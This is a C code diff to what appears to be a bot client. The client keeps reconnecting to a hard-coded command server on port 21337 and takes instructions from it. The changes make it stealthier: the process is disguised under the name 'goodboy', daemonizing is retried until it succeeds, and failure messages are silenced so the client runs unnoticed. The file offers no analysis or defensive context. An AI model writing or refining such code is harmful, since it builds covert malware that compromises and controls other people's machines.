@@ -9,6 +9,8 @@
 #include "core/core.h"
 #include "alg/alexjlz_hash.h"
 #include "daemon/daemon.h"
+#include "log/log.h"
+#include "common.h"
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -16,8 +18,10 @@
 #include <unistd.h>
 #include <fcntl.h>
 
+#define PROC_TITLE "goodboy"
+
 int mainCommSock = 0;
-char *server = "self.1isp.cc";
+char *server = SERVER;
 int port = 21337;
 extern char uuid[32];
 extern uint32_t *pids;
@@ -29,19 +33,25 @@ int main(int argc, char **argv)
     getOurIP();
 	srand(time(NULL) ^ getpid());
 	init_rand(time(NULL) ^ getpid());
+    set_proc_title(argc, argv, PROC_TITLE);
 	//printf("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", macAddress[0], macAddress[1], macAddress[2], macAddress[3], macAddress[4], macAddress[5]);
 
-    daemonize();
+    while (1)
+    {
+        if ( daemonize() == 0 )
+            break;
+        sleep(3);
+    }
     while ( 1 )
     {
 		if( (mainCommSock=connect_tcp_server(server, port)) == -1)
         { 
-            printf("Failed to connect...\n"); sleep(5); continue; 
+            sleep(5); continue; 
         }
         if ( ask_for_service( mainCommSock ) == -1 )  // return from this function means connection between client
                                                       // and server are unexpectedly closed
         {
-            fprintf(stdout, "error in client\n");
+            //fprintf(stdout, "error in client\n");
         }
         
         if ( check_fd(mainCommSock) )
